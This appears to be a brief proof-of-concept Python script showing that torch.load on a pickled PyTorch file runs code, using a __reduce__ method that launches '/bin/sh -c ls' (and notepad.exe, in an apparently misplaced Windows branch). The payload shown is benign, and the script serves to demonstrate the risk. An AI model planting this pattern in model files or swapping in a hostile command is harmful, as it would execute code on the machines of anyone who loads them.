import torch
import subprocess

class Demo:
    def __reduce__(self):
        return (
            subprocess.Popen,
            #linux
            (("/bin/sh","-c","ls"),),
            #window
            (("notepad.exe"),),
        )
    
# sep 1    
# torch.save(Demo(),"demo.pth")

# sep 2
model = torch.load("demo.pth",map_location=torch.device('cpu'))
